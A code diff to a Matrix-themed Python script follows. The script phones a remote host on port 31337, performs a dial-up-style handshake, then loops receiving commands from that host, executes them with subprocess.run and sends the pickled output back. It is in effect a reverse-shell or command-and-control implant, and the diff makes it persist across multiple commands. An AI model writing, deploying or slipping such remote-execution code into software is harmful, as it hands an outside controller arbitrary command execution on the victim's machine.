@@ -32,10 +32,10 @@ nebuchadnezzar = 31337
 def sessionStartup(s):
 	# We're using a magic string for our initialization; we'll try 3 times and otherwise fail out.
 	for i in range(1,3):
-		s.sendto("ATDT18005551234".encode(), (trinity,nebuchadnezzar))
+		s.sendall("ATDT18005551234".encode())
 		signal = s.recv(512)
 		if re.search("ATA", signal.decode()):
-			s.sendto("CONNECT".encode(), (trinity, nebuchadnezzar))
+			s.sendall("CONNECT".encode())
 			return True
 	# If Trinity doesn't pick up, we're screwed
 	return False
@@ -68,16 +68,25 @@ def main():
 			connectionEstablished = True
 		if not result:
 			return -1
-		with s:
+		while True:
 			#print("I'm listening") # DEBUG
-			instruction = s.recv(4096)
-			parsedInstructions = instruction.decode().split()
+			#s.setblocking(0)
+			ready = select.select([s], [], [], 300)
+			while (True):
+				if ready[0]:
+					instruction = s.recv(4096)
+					parsedInstructions = instruction.decode().split()
+					break
 			try:
 				results = subprocess.run(parsedInstructions, capture_output=True)
 				p = pickle.dumps(results)
 			except OSError as e:
 				msg = f"Error encountered: {e}"
 				p = pickle.dumps(msg)
+			except IndexError as e:
+				# This should be taken as a sign the client is done with us
+				s.close()
+				return 0
 			try:
 				s.sendall(p)
 			except OSError as e:
@@ -88,4 +97,4 @@ def main():
  
  
 if __name__ == "__main__":
-    sys.exit(main())
+	sys.exit(main())
